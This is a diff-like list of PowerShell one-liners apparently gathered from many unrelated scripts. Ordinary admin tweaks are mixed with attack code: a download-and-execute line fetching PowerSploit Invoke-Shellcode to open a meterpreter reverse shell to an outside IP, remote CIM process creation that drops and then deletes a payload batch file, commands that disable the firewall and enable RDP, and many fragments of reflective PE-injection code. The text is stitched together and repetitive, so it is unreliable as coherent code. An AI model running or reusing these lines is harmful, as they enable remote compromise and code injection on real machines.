+$output = New-Object psobject; $output | Add-Member -MemberType NoteProperty -Name "User" -Value $user
+$output = New-Object psobject; $output | Add-Member -MemberType NoteProperty -Name "Drive" -Value $DriveKeys[$n]
+$output = New-Object psobject; $output | Add-Member -MemberType NoteProperty -Name "Path" -Value $DriveKey.GetValue("RemotePath")
+Write-Verbose "Starting job for with following params: `r`nServer: $server `r`nDisk: $Disk `r`nThreshold: $AlertThreshold MB `r`nLog File: $LogPath `r`nFrequency: $Frequency"
+$output = New-Object -TypeName PSObject; $output | Add-Member -NotePropertyName 'Size' -NotePropertyValue ''; $output | Add-Member -NotePropertyName 'Time' -NotePropertyValue ''
+Write-Host "Disabling Telemetry..."
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Type DWord -Value 0
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" -Name "Value" -Type DWord -Value 0
+Write-Output ("".padleft($pad+5) + $ChildUser.samaccountname + " - " + $ChildUser.givenname + " " + $ChildUser.surname + " Enabled: " + $ChildUser.enabled)
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" -Name "Value" -Type DWord -Value 0
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" -Name "SensorPermissionState" -Type DWord -Value 0
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\lfsvc\Service\Configuration" -Name "Status" -Type DWord -Value 0
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Siuf\Rules" -Name "NumberOfSIUFInPeriod" -Type DWord -Value 0
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" -Name "Enabled" -Type DWord -Value 0
+New-Item -Path "HKCU:\Software\Microsoft\Personalization\Settings" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Personalization\Settings" -Name "AcceptedPrivacyPolicy" -Type DWord -Value 0
+New-Item -Path "HKCU:\Software\Microsoft\InputPersonalization" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\InputPersonalization" -Name "RestrictImplicitTextCollection" -Type DWord -Value 1
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\InputPersonalization" -Name "RestrictImplicitInkCollection" -Type DWord -Value 1
+ECHO "SYSTEM FORENSICS SNAPSHOT" > $outputpath\README.TXT
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" -Name "DODownloadMode" -Type DWord -Value 1
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization" -Name "SystemSettingsDownloadMode" -Type DWord -Value 3
+Write-Host "Stopping and disabling Diagnostics Tracking Service..."
+Stop-Service "DiagTrack"
+Set-Service "DiagTrack" -StartupType Disabled
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\WindowsUpdate\UX\Settings" -Name "UxOption" -Type DWord -Value 1
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Personalization" -Name "NoLockScreen" -Type DWord -Value 1
+Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\StickyKeys" -Name "Flags" -Type String -Value "506"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Type DWord -Value 0
+Remove-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{24ad3ad4-a569-4530-98e1-ab02f9417aa8}" -Recurse -ErrorAction SilentlyContinue
+ECHO "Run from Computer: $env:COMPUTERNAME" >> $outputpath\README.TXT
+Remove-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{3ADD1653-EB32-4cb0-BBD7-DFA0ABB5ACCA}" -Recurse -ErrorAction SilentlyContinue
+Get-AppxPackage "Microsoft.3DBuilder" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.BingFinance" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.BingNews" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.BingSports" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.BingWeather" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.Getstarted" | Remove-AppxPackage
+Get-AppxPackage "Microsoft.MicrosoftOfficeHub" | Remove-AppxPackage
+New-Item -Path "HKCR:\Applications\photoviewer.dll\shell\open\command" -Force | Out-Null
+New-Item -Path "HKCR:\Applications\photoviewer.dll\shell\open\DropTarget" -Force | Out-Null
+ECHO "Target Computer: $fqdn" >> $outputpath\README.TXT
+Set-ItemProperty -Path "HKCR:\Applications\photoviewer.dll\shell\open" -Name "MuiVerb" -Type String -Value "@photoviewer.dll,-3043"
+Set-ItemProperty -Path "HKCR:\Applications\photoviewer.dll\shell\open\command" -Name "(Default)" -Type ExpandString -Value "%SystemRoot%\System32\rundll32.exe `"%ProgramFiles%\Windows Photo Viewer\PhotoViewer.dll`", ImageView_Fullscreen %1"
+Set-ItemProperty -Path "HKCR:\Applications\photoviewer.dll\shell\open\DropTarget" -Name "Clsid" -Type String -Value "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}"
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+netsh advfirewall set  currentprofile state off
+$x = "Desktop-25D16D"; $colItems = get-wmiobject -class "Win32_ComputerSystem" -namespace "root\CIMV2" -computername $x
+$GUID = (Get-NetAdapter -Name 'wi-fi').interfaceGUID; $path = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\$guid"
+IEX (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d0fff7b6371ccb52952268f47ae68e85c3aeeb91/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 162.19.3.22 –Lport 443 –Force
+$PsCommand = "powershell.exe -V 2 -NoP -NoL -NonI -W Hidden -Command Set-Content -Path C:\Windows\temp\$random.bat -Value `'$payload`'"; Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $PsCommand} -CimSession $CimSession
+ECHO "Run By User: $env:USERNAME@$env:USERDOMAIN" >> $outputpath\README.TXT
+$Service = Get-CimInstance -ClassName Win32_Service -Filter "Name = '$Random'"
+$CimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential
+$CimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential; $File = Get-CimInstance -Query "SELECT * FROM CIM_DataFile WHERE Name = 'C:\\Windows\\temp\\$Random.bat'" -CimSession $CimSession; $File.Delete()
+$list = get-childitem "C:\" -recurse -ErrorAction silentlycontinue | where {$_.extension -eq ".exe"} | Select FullName
+$list = get-childitem "C:\" -recurse -ErrorAction silentlycontinue | where {$_.extension -eq ".txt"} | Select FullName
+$emailserverips = @('10.3.7.143', '10.3.7.144', '10.3.7.145', '10.3.7.146', '10.3.7.147', '10.3.7.148', '10.3.7.149', '10.3.7.150')
+$registryPath = "HKCU:\SOFTWARE\Classes\$registry"; Remove-Item -Path $registryPath -Recurse -Force
+$ms = New-Object IO.MemoryStream; $cs = New-Object IO.Compression.DeflateStream ($ms,[IO.Compression.CompressionMode]::Compress); $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+$req = New-Object System.Net.WebClient; $req.proxy=[Net.WebRequest]::DefaultWebProxy; $req.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
+$CredentialAssetName = 'DefaultAzureCredential'; $Cred = Get-AutomationPSCredential -Name $CredentialAssetName
+ECHO "Run at: $datentime" >> $outputpath\README.txt
+$secpasswd = ConvertTo-SecureString "Administrator" -AsPlainText -Force
+$Domain = [AppDomain]::CurrentDomain; $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false); $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
+$outputroot="\\server.domain.com\BaselineSnapshot\Output"
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
+$scriptdir="\\server.domain.com\BaselineSnapshot"
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
+$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
+$Domain = [AppDomain]::CurrentDomain; $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
+Register-AzureProvider -ProviderNamespace Microsoft.DocumentDb -Force | Out-Null;
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
+Register-AzureProvider -ProviderNamespace Microsoft.Web -Force | Out-Null;
+Install-ChocolateyPackage "$packageName" "$installerType" "$silentArgs" "$url" -validExitCodes $validExitCodes;$packageName = '{{PackageName}}';$installerType = 'EXE';$silentArgs = '/S';$registryPath32 = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VTUploader';$registryPathWow6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\VTUploader'
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
+$AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes | Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
+$Domain = [AppDomain]::CurrentDomain; $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$Domain = [AppDomain]::CurrentDomain; $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false); $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods'); $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods'); $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+[Byte[]] $CallStub = 0x48,0xB8 ; $CallStub += 0xFF,0xD0; $CallStub += 0x6A,0x00; $CallStub += 0x48,0xB8
+[Byte[]] $CallStub = 0xB8; $CallStub += 0xFF,0xD0; $CallStub += 0x6A,0x00; $CallStub += 0xFF,0xD0
+$Domain = [AppDomain]::CurrentDomain; $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false); $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]; $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null; $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null; $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null; $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+Register-AzureProvider -ProviderNamespace Sendgrid.Email -Force | Out-Null;
+$Domain = [AppDomain]::CurrentDomain; $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false); $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]; $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
+$Domain = [AppDomain]::CurrentDomain; $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false); $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]; $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null; $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+$Domain = [AppDomain]::CurrentDomain; $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly'); $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false); $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]; $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16]); $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null; $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null; $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null; $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
+Write-Verbose "Tuning Compression and Application Pool recycling"
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
+Set-WebConfigurationProperty "system.webServer/httpCompression" -Name staticCompressionDisableCpuUsage -value 90 -Verbose
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
+$Win32Constants = New-Object System.Object; $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
+$Win32Functions = New-Object System.Object; $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc; $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+Set-WebConfigurationProperty "system.webServer/httpCompression" -Name dynamicCompressionDisableCpuUsage -value 80 -Verbose
+$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx; $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy; $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr]); 
+$memsetAddr = Get-ProcAddress msvcrt.dll memset; $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+$Win32Functions = New-Object System.Object; $Win32Functions = New-Object System.Object; $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA; $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+$Win32Functions = New-Object System.Object; $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress; $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$Win32Functions = New-Object System.Object; $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress; $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr]); $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
+$Win32Functions = New-Object System.Object; $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree; $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool]); $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate); $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
+$Win32Functions = New-Object System.Object; $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect; $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]); $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate); $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+$Win32Functions = New-Object System.Object; $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA; $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr]); $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate); $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
+$Win32Functions = New-Object System.Object; $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary; $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr]); $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
+Set-WebConfigurationProperty "system.applicationHost/applicationPools/applicationPoolDefaults/recycling" -Name logEventOnRecycle -value "Time, Requests, Schedule, Memory, IsapiUnhealthy, OnDemand, ConfigChange, PrivateMemory" -Verbose
+$Win32Functions = New-Object System.Object; $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess; $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]); $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
